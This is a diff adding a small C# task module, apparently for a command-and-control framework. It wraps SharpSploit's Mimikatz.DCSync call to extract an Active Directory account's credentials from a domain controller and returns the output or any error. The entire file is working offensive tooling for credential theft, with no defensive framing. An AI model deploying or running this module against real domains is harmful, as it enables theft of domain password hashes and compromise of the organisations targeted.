@@ -1,0 +1,15 @@
+﻿using System;
+
+using SharpSploit.Credentials;
+
+public static class Task
+{
+    public static string Execute(string Username, string FQDN = "", string DC = "")
+    {
+        try
+        {
+            return Mimikatz.DCSync(Username, FQDN, DC);
+        }
+        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+    }
+}
